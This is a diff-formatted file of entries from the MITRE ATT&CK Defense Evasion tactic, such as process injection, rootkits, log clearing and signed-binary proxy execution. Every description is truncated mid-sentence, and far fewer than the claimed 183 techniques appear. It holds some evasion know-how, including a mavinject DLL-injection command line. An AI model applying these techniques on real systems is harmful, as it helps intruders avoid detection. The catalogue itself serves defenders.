@@ -1,0 +1,1652 @@
+SOURCE: MITRE ATT&CK Enterprise — Tactic: Defense Evasion
+FRAMEWORK: MITRE ATT&CK
+TACTIC: Defense Evasion
+TECHNIQUE COUNT: 183
+======================================================================
+
+TECHNIQUE: Extra Window Memory Injection
+TECHNIQUE ID: T1055.011
+TACTIC: Defense Evasion, Privilege Escalation
+PLATFORMS: Windows
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may inject malicious code into process via Extra Window Memory (EWM) in order to evade process-based defenses as well as possibly elevate privileges. EWM injection is a method of executing arbitrary code in the address space of a separate live process. Before creating a window, graphical Windows-based processes must prescribe to or register a windows class, which stipulate appearance and behavior (via windows procedures, which are functions that handle input/output of data). Registration of new windows classes can include a request for up to 40 bytes of EWM to be appended to the allocated memory of each instance of that class. This EWM is intended to store data specific to that w
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Socket Filters
+TECHNIQUE ID: T1205.002
+TACTIC: Defense Evasion, Persistence, Command And Control
+PLATFORMS: Linux, macOS, Windows
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may attach filters to a network socket to monitor then activate backdoors used for persistence or command and control. With elevated permissions, adversaries can use features such as the `libpcap` library to open sockets and install filters to allow or disallow certain types of data to come through the socket. The filter may apply to all traffic passing through the specified network interface (or every interface if not specified). When the network interface receives a packet matching the filter criteria, additional actions can be triggered on the host, such as activation of a reverse shell. To establish a connection, an adversary sends a crafted packet to the targeted host that m
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Fileless Storage
+TECHNIQUE ID: T1027.011
+TACTIC: Defense Evasion
+PLATFORMS: Windows, Linux
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may store data in "fileless" formats to conceal malicious activity from defenses. Fileless storage can be broadly defined as any format other than a file. Common examples of non-volatile fileless storage in Windows systems include the Windows Registry, event logs, or WMI repository. Shared memory directories on Linux systems (`/dev/shm`, `/run/shm`, `/var/run`, and `/var/lock`) and volatile directories on Network Devices (`/tmp` and `/volatile`) may also be considered fileless storage, as files written to these directories are mapped directly to RAM and not stored on the disk.. Similar to fileless in-memory behaviors such as [Reflective Code Loading](https://attack.mitre.org/tech
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Rundll32
+TECHNIQUE ID: T1218.011
+TACTIC: Defense Evasion
+PLATFORMS: Windows
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. [Shared Modules](https://attack.mitre.org/techniques/T1129)), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex: <code>rundll32.exe {DLLname, DLLfunction}</code>). Rundll32.exe can also be used to execute [Control Panel](https://attack.mitre.org/techniques/T1218/002) Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>.
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Embedded Payloads
+TECHNIQUE ID: T1027.009
+TACTIC: Defense Evasion
+PLATFORMS: Linux, macOS, Windows
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may embed payloads within other files to conceal malicious content from defenses. Otherwise seemingly benign files (such as scripts and executables) may be abused to carry and obfuscate malicious payloads and content. In some cases, embedded payloads may also enable adversaries to [Subvert Trust Controls](https://attack.mitre.org/techniques/T1553) by not impacting execution controls such as digital signatures and notarization tickets. Adversaries may embed payloads in various file formats to hide payloads. This is similar to [Steganography](https://attack.mitre.org/techniques/T1027/003), though does not involve weaving malicious content into specific bytes and patterns related to
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Revert Cloud Instance
+TECHNIQUE ID: T1578.004
+TACTIC: Defense Evasion
+PLATFORMS: IaaS
+SUB-TECHNIQUE: Yes
+DESCRIPTION: An adversary may revert changes made to a cloud instance after they have performed malicious activities in attempt to evade detection and remove evidence of their presence. In highly virtualized environments, such as cloud-based infrastructure, this may be accomplished by restoring virtual machine (VM) or data storage snapshots through the cloud management dashboard or cloud APIs. Another variation of this technique is to utilize temporary storage attached to the compute instance. Most cloud providers provide various types of storage including persistent, local, and/or ephemeral, with the ephemeral types often reset upon stop/restart of the VM.
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: File/Path Exclusions
+TECHNIQUE ID: T1564.012
+TACTIC: Defense Evasion
+PLATFORMS: Linux, macOS, Windows
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may attempt to hide their file-based artifacts by writing them to specific folders or file names excluded from antivirus (AV) scanning and other defensive capabilities. AV and other file-based scanners often include exclusions to optimize performance as well as ease installation and legitimate use of applications. These exclusions may be contextual (e.g., scans are only initiated in response to specific triggering events/alerts), but are also often hardcoded strings referencing specific folders and/or files assumed to be trusted and legitimate. Adversaries may abuse these exclusions to hide their file-based artifacts. For example, rather than tampering with tool settings to add a
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Linux and Mac File and Directory Permissions Modification
+TECHNIQUE ID: T1222.002
+TACTIC: Defense Evasion
+PLATFORMS: macOS, Linux
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files. File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.). Most Linux and Linux-based platforms provide a standard set of permission groups (user, group, and other) and a standard set of permissions (read, write, and execute) that are applied to each group. While nuances of each platform’s permissions implementat
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: PubPrn
+TECHNIQUE ID: T1216.001
+TACTIC: Defense Evasion
+PLATFORMS: Windows
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may use PubPrn to proxy execution of malicious remote files. PubPrn.vbs is a [Visual Basic](https://attack.mitre.org/techniques/T1059/005) script that publishes a printer to Active Directory Domain Services. The script may be signed by Microsoft and is commonly executed through the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) via <code>Cscript.exe</code>. For example, the following code publishes a printer within the specified domain: <code>cscript pubprn Printer1 LDAP://CN=Container1,DC=Domain1,DC=Com</code>. Adversaries may abuse PubPrn to execute malicious payloads hosted on remote sites. To do so, adversaries may set the second <code>script:</code> p
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Direct Volume Access
+TECHNIQUE ID: T1006
+TACTIC: Defense Evasion
+PLATFORMS: Network Devices, Windows
+SUB-TECHNIQUE: No
+DESCRIPTION: Adversaries may directly access a volume to bypass file access controls and file system monitoring. Windows allows programs to have direct access to logical volumes. Programs with direct access may read and write files directly from the drive by analyzing file system data structures. This technique may bypass Windows file access controls as well as file system monitoring tools. Utilities, such as `NinjaCopy`, exist to perform these actions in PowerShell. Adversaries may also use built-in or third-party utilities (such as `vssadmin`, `wbadmin`, and [esentutl](https://attack.mitre.org/software/S0404)) to create shadow copies or backups of data from system volumes.
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Modify Cloud Resource Hierarchy
+TECHNIQUE ID: T1666
+TACTIC: Defense Evasion
+PLATFORMS: IaaS
+SUB-TECHNIQUE: No
+DESCRIPTION: Adversaries may attempt to modify hierarchical structures in infrastructure-as-a-service (IaaS) environments in order to evade defenses. IaaS environments often group resources into a hierarchy, enabling improved resource management and application of policies to relevant groups. Hierarchical structures differ among cloud providers. For example, in AWS environments, multiple accounts can be grouped under a single organization, while in Azure environments, multiple subscriptions can be grouped under a single management group. Adversaries may add, delete, or otherwise modify resource groups within an IaaS hierarchy. For example, in Azure environments, an adversary who has gained access to a Gl
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Email Hiding Rules
+TECHNIQUE ID: T1564.008
+TACTIC: Defense Evasion
+PLATFORMS: Windows, Linux, macOS, Office Suite
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may use email rules to hide inbound emails in a compromised user's mailbox. Many email clients allow users to create inbox rules for various email functions, including moving emails to other folders, marking emails as read, or deleting emails. Rules may be created or modified within email clients or through external features such as the <code>New-InboxRule</code> or <code>Set-InboxRule</code> [PowerShell](https://attack.mitre.org/techniques/T1059/001) cmdlets on Windows systems. Adversaries may utilize email rules within a compromised user's mailbox to delete and/or move emails to less noticeable folders. Adversaries may do this to hide security alerts, C2 communication, or respo
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Encrypted/Encoded File
+TECHNIQUE ID: T1027.013
+TACTIC: Defense Evasion
+PLATFORMS: Linux, macOS, Windows
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may encrypt or encode files to obfuscate strings, bytes, and other specific patterns to impede detection. Encrypting and/or encoding file content aims to conceal malicious artifacts within a file used in an intrusion. Many other techniques, such as [Software Packing](https://attack.mitre.org/techniques/T1027/002), [Steganography](https://attack.mitre.org/techniques/T1027/003), and [Embedded Payloads](https://attack.mitre.org/techniques/T1027/009), share this same broad objective. Encrypting and/or encoding files could lead to a lapse in detection of static signatures, only for this malicious content to be revealed (i.e., [Deobfuscate/Decode Files or Information](https://attack.mi
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Rootkit
+TECHNIQUE ID: T1014
+TACTIC: Defense Evasion
+PLATFORMS: Linux, macOS, Windows
+SUB-TECHNIQUE: No
+DESCRIPTION: Adversaries may use rootkits to hide the presence of programs, files, network connections, services, drivers, and other system components. Rootkits are programs that hide the existence of malware by intercepting/hooking and modifying operating system API calls that supply system information. Rootkits or rootkit enabling functionality may reside at the user or kernel level in the operating system or lower, to include a hypervisor or [System Firmware](https://attack.mitre.org/techniques/T1542/001). Rootkits have been seen for Windows, Linux, and Mac OS X systems. Rootkits that reside or modify boot sectors are known as [Bootkit](https://attack.mitre.org/techniques/T1542/003)s and specifically 
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Double File Extension
+TECHNIQUE ID: T1036.007
+TACTIC: Defense Evasion
+PLATFORMS: Windows
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may abuse a double extension in the filename as a means of masquerading the true file type. A file name may include a secondary file type extension that may cause only the first extension to be displayed (ex: <code>File.txt.exe</code> may render in some views as just <code>File.txt</code>). However, the second extension is the true file type that determines how the file is opened and executed. The real file extension may be hidden by the operating system in the file browser (ex: explorer.exe), as well as in any software configured using or similar to the system’s policies. Adversaries may abuse double extensions to attempt to conceal dangerous file types of payloads. A very commo
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Modify Cloud Compute Infrastructure
+TECHNIQUE ID: T1578
+TACTIC: Defense Evasion
+PLATFORMS: IaaS
+SUB-TECHNIQUE: No
+DESCRIPTION: An adversary may attempt to modify a cloud account's compute service infrastructure to evade defenses. A modification to the compute service infrastructure can include the creation, deletion, or modification of one or more components such as compute instances, virtual machines, and snapshots. Permissions gained from the modification of infrastructure components may bypass restrictions that prevent access to existing infrastructure. Modifying infrastructure components may also allow an adversary to evade detection and remove evidence of their presence.
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Mavinject
+TECHNIQUE ID: T1218.013
+TACTIC: Defense Evasion
+PLATFORMS: Windows
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may abuse mavinject.exe to proxy execution of malicious code. Mavinject.exe is the Microsoft Application Virtualization Injector, a Windows utility that can inject code into external processes as part of Microsoft Application Virtualization (App-V). Adversaries may abuse mavinject.exe to inject malicious DLLs into running processes (i.e. [Dynamic-link Library Injection](https://attack.mitre.org/techniques/T1055/001)), allowing for arbitrary code execution (ex. <code>C:\Windows\system32\mavinject.exe PID /INJECTRUNNING PATH_DLL</code>). Since mavinject.exe may be digitally signed by Microsoft, proxying execution via this method may evade detection by security products because the 
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Match Legitimate Resource Name or Location
+TECHNIQUE ID: T1036.005
+TACTIC: Defense Evasion
+PLATFORMS: Containers, ESXi, Linux, macOS, Windows
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may match or approximate the name or location of legitimate files, Registry keys, or other resources when naming/placing them. This is done for the sake of evading defenses and observation. This may be done by placing an executable in a commonly trusted directory (ex: under System32) or giving it the name of a legitimate, trusted program (ex: `svchost.exe`). Alternatively, a Windows Registry key may be given a close approximation to a key used by a legitimate program. In containerized environments, a threat actor may create a resource in a trusted namespace or one that matches the naming convention of a container pod or cluster.
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Weaken Encryption
+TECHNIQUE ID: T1600
+TACTIC: Defense Evasion
+PLATFORMS: Network Devices
+SUB-TECHNIQUE: No
+DESCRIPTION: Adversaries may compromise a network device’s encryption capability in order to bypass encryption that would otherwise protect data communications. Encryption can be used to protect transmitted network traffic to maintain its confidentiality (protect against unauthorized disclosure) and integrity (protect against unauthorized changes). Encryption ciphers are used to convert a plaintext message to ciphertext and can be computationally intensive to decipher without the associated decryption key. Typically, longer keys increase the cost of cryptanalysis, or decryption without the key. Adversaries can compromise and manipulate devices that perform encryption of network traffic. For example, thro
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Masquerade File Type
+TECHNIQUE ID: T1036.008
+TACTIC: Defense Evasion
+PLATFORMS: Linux, macOS, Windows
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may masquerade malicious payloads as legitimate files through changes to the payload's formatting, including the file’s signature, extension, icon, and contents. Various file types have a typical standard format, including how they are encoded and organized. For example, a file’s signature (also known as header or magic bytes) is the beginning bytes of a file and is often used to identify the file’s type. For example, the header of a JPEG file, is <code> 0xFF 0xD8</code> and the file extension is either `.JPE`, `.JPEG` or `.JPG`. Adversaries may edit the header’s hex code and/or the file extension of a malicious payload in order to bypass file validation checks and/or input sanit
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Hide Artifacts
+TECHNIQUE ID: T1564
+TACTIC: Defense Evasion
+PLATFORMS: Linux, Office Suite, Windows, macOS, ESXi
+SUB-TECHNIQUE: No
+DESCRIPTION: Adversaries may attempt to hide artifacts associated with their behaviors to evade detection. Operating systems may have features to hide various artifacts, such as important system files and administrative task execution, to avoid disrupting user work environments and prevent users from changing files or features on the system. Adversaries may abuse these features to hide artifacts such as files, directories, user accounts, or other system activity to evade detection. Adversaries may also attempt to hide artifacts associated with malicious behavior by creating computing regions that are isolated from common security instrumentation, such as through the use of virtualization technology.
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Trust Modification
+TECHNIQUE ID: T1484.002
+TACTIC: Defense Evasion, Privilege Escalation
+PLATFORMS: Identity Provider, Windows
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may add new domain trusts, modify the properties of existing domain trusts, or otherwise change the configuration of trust relationships between domains and tenants to evade defenses and/or elevate privileges.Trust details, such as whether or not user identities are federated, allow authentication and authorization properties to apply between domains or tenants for the purpose of accessing shared resources. These trust objects may include accounts, credentials, and other authentication material applied to servers, tokens, and domains. Manipulating these trusts may allow an adversary to escalate privileges and/or evade defenses by modifying settings to add objects which they contr
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Safe Mode Boot
+TECHNIQUE ID: T1562.009
+TACTIC: Defense Evasion
+PLATFORMS: Windows
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may abuse Windows safe mode to disable endpoint defenses. Safe mode starts up the Windows operating system with a limited set of drivers and services. Third-party security software such as endpoint detection and response (EDR) tools may not start after booting Windows in safe mode. There are two versions of safe mode: Safe Mode and Safe Mode with Networking. It is possible to start additional services after a safe mode boot. Adversaries may abuse safe mode to disable endpoint defenses that may not start with a limited boot. Hosts can be forced into safe mode after the next reboot via modifications to Boot Configuration Data (BCD) stores, which are files that manage boot applicati
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: TFTP Boot
+TECHNIQUE ID: T1542.005
+TACTIC: Defense Evasion, Persistence
+PLATFORMS: Network Devices
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may abuse netbooting to load an unauthorized network device operating system from a Trivial File Transfer Protocol (TFTP) server. TFTP boot (netbooting) is commonly used by network administrators to load configuration-controlled network device images from a centralized management server. Netbooting is one option in the boot sequence and can be used to centralize, manage, and control device images. Adversaries may manipulate the configuration on the network device specifying use of a malicious TFTP server, which may be used in conjunction with [Modify System Image](https://attack.mitre.org/techniques/T1601) to load a modified image on device startup or reset. The unauthorized imag
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: System Checks
+TECHNIQUE ID: T1497.001
+TACTIC: Defense Evasion, Discovery
+PLATFORMS: Linux, macOS, Windows
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may employ various system checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) during automated discovery to shape follow-on behaviors. Specific checks will vary b
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Clear Linux or Mac System Logs
+TECHNIQUE ID: T1070.002
+TACTIC: Defense Evasion
+PLATFORMS: Linux, macOS
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as: * <code>/var/log/messages:</code>: General and system-related messages * <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs * <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records * <code>/var/log/kern.log</code>: Kernel logs * <code>/var/log/cron.log</code>: Crond logs * <code>/var/log/maillog</code>: Mail server logs *
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: InstallUtil
+TECHNIQUE ID: T1218.004
+TACTIC: Defense Evasion
+PLATFORMS: Windows
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may use InstallUtil to proxy execution of code through a trusted Windows utility. InstallUtil is a command-line utility that allows for installation and uninstallation of resources by executing specific installer components specified in .NET binaries. The InstallUtil binary may also be digitally signed by Microsoft and located in the .NET directories on a Windows system: <code>C:\Windows\Microsoft.NET\Framework\v<version>\InstallUtil.exe</code> and <code>C:\Windows\Microsoft.NET\Framework64\v<version>\InstallUtil.exe</code>. InstallUtil may also be used to bypass application control through use of attributes within the binary that execute the class decorated with the attribute <c
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Stripped Payloads
+TECHNIQUE ID: T1027.008
+TACTIC: Defense Evasion
+PLATFORMS: macOS, Linux, Windows, Network Devices
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may attempt to make a payload difficult to analyze by removing symbols, strings, and other human readable information. Scripts and executables may contain variables names and other strings that help developers document code functionality. Symbols are often created by an operating system’s `linker` when executable payloads are compiled. Reverse engineers use these symbols and strings to analyze code and to identify functionality in payloads. Adversaries may use stripped payloads in order to make malware analysis more difficult. For example, compilers and other tools may provide features to remove or obfuscate strings and symbols. Adversaries have also used stripped payload formats
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Gatekeeper Bypass
+TECHNIQUE ID: T1553.001
+TACTIC: Defense Evasion
+PLATFORMS: macOS
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may modify file attributes and subvert Gatekeeper functionality to evade user prompts and execute untrusted programs. Gatekeeper is a set of technologies that act as layer of Apple’s security model to ensure only trusted applications are executed on a host. Gatekeeper was built on top of File Quarantine in Snow Leopard (10.6, 2009) and has grown to include Code Signing, security policy compliance, Notarization, and more. Gatekeeper also treats applications running for the first time differently than reopened applications. Based on an opt-in system, when files are downloaded an extended attribute (xattr) called `com.apple.quarantine` (also known as a quarantine flag) can be set on
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Code Signing
+TECHNIQUE ID: T1553.002
+TACTIC: Defense Evasion
+PLATFORMS: macOS, Windows
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may create, acquire, or steal code signing materials to sign their malware or tools. Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with. The certificates used during an operation may be created, acquired, or stolen by the adversary. Unlike [Invalid Code Signature](https://attack.mitre.org/techniques/T1036/001), this activity will result in a valid signature. Code signing to verify software on first run can be used on modern Windows and macOS systems. It is not used on Linux due to the decentralized nature of the platform. Code signing certificates may be used to bypass security policies that requ
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Break Process Trees
+TECHNIQUE ID: T1036.009
+TACTIC: Defense Evasion
+PLATFORMS: Linux, macOS
+SUB-TECHNIQUE: Yes
+DESCRIPTION: An adversary may attempt to evade process tree-based analysis by modifying executed malware's parent process ID (PPID). If endpoint protection software leverages the “parent-child" relationship for detection, breaking this relationship could result in the adversary’s behavior not being associated with previous process tree activity. On Unix-based systems breaking this process tree is common practice for administrators to execute software using scripts and programs. On Linux systems, adversaries may execute a series of [Native API](https://attack.mitre.org/techniques/T1106) calls to alter malware's process tree. For example, adversaries can execute their payload without any arguments, call th
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Windows File and Directory Permissions Modification
+TECHNIQUE ID: T1222.001
+TACTIC: Defense Evasion
+PLATFORMS: Windows
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files. File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.). Windows implements file and directory ACLs as Discretionary Access Control Lists (DACLs). Similar to a standard ACL, DACLs identifies the accounts that are allowed or denied access to a securable object. When an attempt is made to access a securable objec
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Msiexec
+TECHNIQUE ID: T1218.007
+TACTIC: Defense Evasion
+PLATFORMS: Windows
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may abuse msiexec.exe to proxy execution of malicious payloads. Msiexec.exe is the command-line utility for the Windows Installer and is thus commonly associated with executing installation packages (.msi). The Msiexec.exe binary may also be digitally signed by Microsoft. Adversaries may abuse msiexec.exe to launch local or network accessible MSI files. Msiexec.exe can also execute DLLs. Since it may be signed and native on Windows systems, msiexec.exe can be used to bypass application control solutions that do not account for its potential abuse. Msiexec.exe execution may also be elevated to SYSTEM privileges if the <code>AlwaysInstallElevated</code> policy is enabled.
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Clear Network Connection History and Configurations
+TECHNIQUE ID: T1070.007
+TACTIC: Defense Evasion
+PLATFORMS: Linux, macOS, Windows, Network Devices
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may clear or remove evidence of malicious network connections in order to clean up traces of their operations. Configuration settings as well as various artifacts that highlight connection history may be created on a system and/or in application logs from behaviors that require network connections, such as [Remote Services](https://attack.mitre.org/techniques/T1021) or [External Remote Services](https://attack.mitre.org/techniques/T1133). Defenders may use these artifacts to monitor or otherwise analyze network connections created by adversaries. Network connection history may be stored in various locations. For example, RDP connection history may be stored in Windows Registry va
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Reduce Key Space
+TECHNIQUE ID: T1600.001
+TACTIC: Defense Evasion
+PLATFORMS: Network Devices
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may reduce the level of effort required to decrypt data transmitted over the network by reducing the cipher strength of encrypted communications. Adversaries can weaken the encryption software on a compromised network device by reducing the key size used by the software to convert plaintext to ciphertext (e.g., from hundreds or thousands of bytes to just a couple of bytes). As a result, adversaries dramatically reduce the amount of effort needed to decrypt the protected information without the key. Adversaries may modify the key size used and other encryption parameters using specialized commands in a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) introduced 
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Clear Command History
+TECHNIQUE ID: T1070.003
+TACTIC: Defense Evasion
+PLATFORMS: ESXi, Linux, macOS, Network Devices, Windows
+SUB-TECHNIQUE: Yes
+DESCRIPTION: In addition to clearing system logs, an adversary may clear the command history of a compromised account to conceal the actions undertaken during an intrusion. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done. On Linux and macOS, these command histories can be accessed in a few different ways. While logged in, this command history is tracked in a file pointed to by the environment variable <code>HISTFILE</code>. When a user logs off a system, this information is flushed to a file in the user's home directory called <code>~/.bash_history</code>. The benefit of this is that it allows users to go back to commands th
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Indirect Command Execution
+TECHNIQUE ID: T1202
+TACTIC: Defense Evasion
+PLATFORMS: Windows
+SUB-TECHNIQUE: No
+DESCRIPTION: Adversaries may abuse utilities that allow for command execution to bypass security restrictions that limit the use of command-line interpreters. Various Windows utilities may be used to execute commands, possibly without invoking [cmd](https://attack.mitre.org/software/S0106). For example, [Forfiles](https://attack.mitre.org/software/S0193), the Program Compatibility Assistant (`pcalua.exe`), components of the Windows Subsystem for Linux (WSL), `Scriptrunner.exe`, as well as other utilities may invoke the execution of programs and commands from a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), Run window, or via scripts. Adversaries may also abuse the `ssh.ex
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Deobfuscate/Decode Files or Information
+TECHNIQUE ID: T1140
+TACTIC: Defense Evasion
+PLATFORMS: ESXi, Linux, macOS, Windows
+SUB-TECHNIQUE: No
+DESCRIPTION: Adversaries may use [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027) to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware or by using utilities present on the system. One such example is the use of [certutil](https://attack.mitre.org/software/S0160) to decode a remote access tool portable executable file that has been hidden inside a certificate file. Another example is using the Windows <code>copy /b</code> or <code>type</code> command to reassemble binary fragments into a malicious pay
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Impair Defenses
+TECHNIQUE ID: T1562
+TACTIC: Defense Evasion
+PLATFORMS: Windows, IaaS, Linux, macOS, Containers, Network Devices, Identity Provider, Office Suite, ESXi
+SUB-TECHNIQUE: No
+DESCRIPTION: Adversaries may maliciously modify components of a victim environment in order to hinder or disable defensive mechanisms. This not only involves impairing preventative defenses, such as firewalls and anti-virus, but also detection capabilities that defenders can use to audit activity and identify malicious behavior. This may also span both native defenses as well as supplemental capabilities installed by users and administrators. Adversaries may also impair routine operations that contribute to defensive hygiene, such as blocking users from logging out, preventing a system from shutting down, or disabling or modifying the update process. Adversaries could also target event aggregation and an
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Thread Execution Hijacking
+TECHNIQUE ID: T1055.003
+TACTIC: Defense Evasion, Privilege Escalation
+PLATFORMS: Windows
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may inject malicious code into hijacked processes in order to evade process-based defenses as well as possibly elevate privileges. Thread Execution Hijacking is a method of executing arbitrary code in the address space of a separate live process. Thread Execution Hijacking is commonly performed by suspending an existing process then unmapping/hollowing its memory, which can then be replaced with malicious code or the path to a DLL. A handle to an existing victim process is first created with native Windows API calls such as <code>OpenThread</code>. At this point the process can be suspended then written to, realigned to the injected code, and resumed via <code>SuspendThread </cod
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Masquerading
+TECHNIQUE ID: T1036
+TACTIC: Defense Evasion
+PLATFORMS: Containers, ESXi, Linux, macOS, Windows
+SUB-TECHNIQUE: No
+DESCRIPTION: Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names. Renaming abusable system utilities to evade security monitoring is also a form of [Masquerading](https://attack.mitre.org/techniques/T1036).
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Clear Mailbox Data
+TECHNIQUE ID: T1070.008
+TACTIC: Defense Evasion
+PLATFORMS: Linux, macOS, Office Suite, Windows
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may modify mail and mail application data to remove evidence of their activity. Email applications allow users and other programs to export and delete mailbox data via command line tools or use of APIs. Mail application data can be emails, email metadata, or logs generated by the application or operating system, such as export requests. Adversaries may manipulate emails and mailbox data to remove logs, artifacts, and metadata, such as evidence of [Phishing](https://attack.mitre.org/techniques/T1566)/[Internal Spearphishing](https://attack.mitre.org/techniques/T1534), [Email Collection](https://attack.mitre.org/techniques/T1114), [Mail Protocols](https://attack.mitre.org/technique
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Process Injection
+TECHNIQUE ID: T1055
+TACTIC: Defense Evasion, Privilege Escalation
+PLATFORMS: Linux, macOS, Windows
+SUB-TECHNIQUE: No
+DESCRIPTION: Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. There are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Traffic Signaling
+TECHNIQUE ID: T1205
+TACTIC: Defense Evasion, Persistence, Command And Control
+PLATFORMS: Linux, macOS, Network Devices, Windows
+SUB-TECHNIQUE: No
+DESCRIPTION: Adversaries may use traffic signaling to hide open ports or other malicious functionality used for persistence or command and control. Traffic signaling involves the use of a magic value or sequence that must be sent to a system to trigger a special response, such as opening a closed port or executing a malicious task. This may take the form of sending a series of packets with certain characteristics before a port will be opened that the adversary can use for command and control. Usually this series of packets consists of attempted connections to a predefined sequence of closed ports (i.e. [Port Knocking](https://attack.mitre.org/techniques/T1205/001)), but can involve unusual flags, specifi
+
